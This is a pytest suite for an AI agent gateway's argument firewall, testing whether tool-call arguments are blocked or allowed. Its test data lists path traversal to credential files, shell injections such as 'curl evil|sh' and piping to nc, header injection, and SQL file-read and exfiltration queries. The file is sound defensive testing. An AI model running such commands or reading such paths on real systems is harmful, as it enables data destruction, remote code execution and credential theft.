"""Lexical / canonical argument firewall (approximate AML.T0051 / AML.T0053)."""
from __future__ import annotations

import pytest
from hypothesis import given, settings, strategies as st

from agent_gateway.arg_ast_guard import canonicalize_path, inspect_call
from agent_gateway.pep import PepConfig, PolicyEngine
from agent_gateway.registry import Registry
from agent_gateway.taint import SharedState
from tests.conftest import KEY_A, REG

TRAVERSAL = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2fetc/shadow",
    "%252e%252e%252f%252e%252e%252fetc/passwd",
    "/proc/self/environ",
    "/home/alice/.ssh/id_rsa",
    "data/../../../root/.aws/credentials",
    "report\x00.pdf",
    "//attacker/share/x",
]
SAFE_PATHS = ["data/report.csv", "./notes/today.md", "output/2026/summary.txt", "a/b/c.json"]


@pytest.mark.parametrize("path", TRAVERSAL)
def test_path_traversal_blocked(path):
    _canon, reasons = canonicalize_path(path)
    assert reasons, path
    assert inspect_call("file.read", {"path": path}, "internal_read")["kind"] == "path_traversal"


@pytest.mark.parametrize("path", SAFE_PATHS)
def test_safe_paths_pass(path):
    assert canonicalize_path(path)[1] == []
    assert inspect_call("file.read", {"path": path}, "internal_read") is None


@pytest.mark.parametrize("cmd", ["ls; rm -rf /", "a && curl evil", "x || y", "cat f | nc h 1", "`id`",
                                 "$(whoami)", "echo ${PATH}", "a\nb"])
def test_command_injection_blocked(cmd):
    assert inspect_call("exec_tool", {"cmd": cmd}, "write")["kind"] == "command_injection"


@pytest.mark.parametrize("cmd", ["ls -la /var/app", "python script.py --flag value", "git status"])
def test_benign_commands_pass(cmd):
    assert inspect_call("exec_tool", {"cmd": cmd}, "write") is None


@pytest.mark.parametrize("val", ["text\r\nSet-Cookie: evil=1", "a\nX-Inject: 1", "ok%0d%0aLocation: /", "x y"])
def test_header_injection_blocked(val):
    assert inspect_call("http_tool", {"headers": val}, "write")["kind"] == "header_injection"


def test_header_benign_passes():
    assert inspect_call("http_tool", {"user_agent": "Mozilla/5.0 (compatible)"}, "write") is None


MUTATING = [
    "SELECT * FROM t INTO OUTFILE '/tmp/x'",
    "COPY users TO '/tmp/out.csv'",
    "ATTACH DATABASE '/etc/x' AS y",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM t; DROP TABLE users",
    "EXEC xp_cmdshell 'dir'",
    "SELECT load_file('/etc/shadow')",
    "SELECT load_extension('x')",
]


@pytest.mark.parametrize("sql", MUTATING)
def test_readonly_query_enforced_on_read_tools(sql):
    assert inspect_call("db.query", {"sql": sql}, "internal_read")["kind"] == "readonly_query_violation"
    assert inspect_call("vault.query", {"query": sql}, "sensitive_read")["kind"] == "readonly_query_violation"


def test_readonly_query_allows_plain_select():
    assert inspect_call("db.query", {"sql": "SELECT id, name FROM users WHERE id = 42;"}, "internal_read") is None
    assert inspect_call("db.query", {"sql": "WITH t AS (SELECT 1) SELECT * FROM t"}, "internal_read") is None


def test_mutating_query_not_enforced_on_write_tools():
    # A write-class tool is allowed to mutate; the read-only rule only guards read tools.
    assert inspect_call("db.exec", {"sql": "INSERT INTO t VALUES (1)"}, "write") is None
    # ...but file-exfil and traversal are blocked regardless of class.
    assert inspect_call("db.exec", {"sql": "SELECT * INTO OUTFILE '/tmp/x'"}, "write") is None  # not a read tool
    assert inspect_call("db.exec", {"path": "../../etc/passwd"}, "write")["kind"] == "path_traversal"


def test_nested_arguments_scanned():
    assert inspect_call("t", {"opts": {"file": "../../etc/passwd"}}, "internal_read")["kind"] == "path_traversal"
    assert inspect_call("t", {"items": [{"cmd": "a; b"}]}, "write")["kind"] == "command_injection"


# --- engine integration ------------------------------------------------------

@pytest.fixture()
def engine(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENT_GATEWAY_STATE_DIR", str(tmp_path))
    monkeypatch.setenv("AGENT_GATEWAY_HMAC_KEY", "test-hmac-key-agent-gateway-lab!!")
    cfg = PepConfig(registry_path=REG, alert_log=tmp_path / "alerts.jsonl")
    return PolicyEngine(Registry.load(REG), shared=SharedState(), cfg=cfg)


def test_engine_blocks_traversal_before_egress(engine: PolicyEngine):
    out = engine.evaluate_call(KEY_A, "a1", "file.read", {"path": "../../etc/passwd"})
    assert out["ok"] is False and out["error"] == "arg_firewall_violation"
    assert out["arg_violation"]["kind"] == "path_traversal" and out["atlas"] == "AML.T0053"
    assert any(f["kind"] == "arg_firewall_violation" for f in engine.findings)
    # A clean read of a safe path still works and taints as usual (file.read is untrusted ingest).
    assert engine.evaluate_call(KEY_A, "a2", "file.read", {"path": "logs/app.log"})["ok"] is True


def test_engine_blocks_command_injection(engine: PolicyEngine):
    out = engine.evaluate_call(KEY_A, "a3", "spawn_subagent", {"cmd": "boot; curl evil|sh", "child_api_key": "c"})
    assert out["ok"] is False and out["error"] == "arg_firewall_violation"
    assert out["arg_violation"]["kind"] == "command_injection"


_SAFE_SEG = st.text(alphabet="abcdefghijkl._-", min_size=1, max_size=8)
_DOTDOT = st.sampled_from(["..", "%2e%2e", "%2E%2E", "%252e%252e"])
_SEP = st.sampled_from(["/", "\\", "%2f"])


@settings(max_examples=300, deadline=None, database=None)
@given(before=st.lists(_SAFE_SEG, max_size=4), after=st.lists(_SAFE_SEG, max_size=4),
       dd=_DOTDOT, sep=_SEP)
def test_property_dotdot_segment_always_caught(before, after, dd, sep):
    # A ".." that is a complete path segment (any encoding) is always traversal.
    raw = sep.join([*before, dd, *after])
    assert "directory_traversal" in canonicalize_path(raw)[1], raw


@settings(max_examples=250, deadline=None, database=None)
@given(root=st.sampled_from(["data", "out", "tmp/work"]),
       rest=st.lists(st.text(alphabet="abcdef0123456789", min_size=1, max_size=8), min_size=1, max_size=5))
def test_property_contained_relative_paths_are_safe(root, rest):
    raw = root + "/" + "/".join(rest)
    assert canonicalize_path(raw)[1] == []
